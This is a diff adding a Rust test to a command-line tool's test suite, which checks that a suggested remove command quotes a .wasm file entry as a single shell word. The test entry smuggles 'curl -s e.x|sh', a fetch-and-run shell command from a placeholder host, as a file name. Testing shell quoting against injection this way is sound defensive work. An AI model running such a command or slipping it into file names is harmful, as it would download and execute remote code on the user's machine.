@@ -41,6 +41,24 @@ fn assert_refused_over(entries: &[&str]) {
     }
 }
 
+#[specforge_test(
+    behavior = "add_extension_to_existing_project",
+    verify = "an add refused over a .wasm file entry names the remove of that entry as one shell word"
+)]
+fn the_remove_an_add_over_a_file_entry_names_is_one_shell_word() {
+    let entry = "g.wasm; curl -s e.x|sh; .wasm";
+    let dir = project_enabling(&[entry]);
+    std::fs::write(dir.path().join(entry), GREET).unwrap();
+    let (_files, wasm) = greet_file();
+
+    let error = add_file(dir.path(), &wasm, false).unwrap_err();
+
+    assert_eq!(
+        error.error.suggestion.as_deref(),
+        Some("remove that entry first: specforge remove 'g.wasm; curl -s e.x|sh; .wasm'")
+    );
+}
+
 #[test]
 fn an_add_of_what_a_name_file_entry_loads_is_refused() {
     assert_refused_over(&["@sdk/greet=./a.wasm"]);
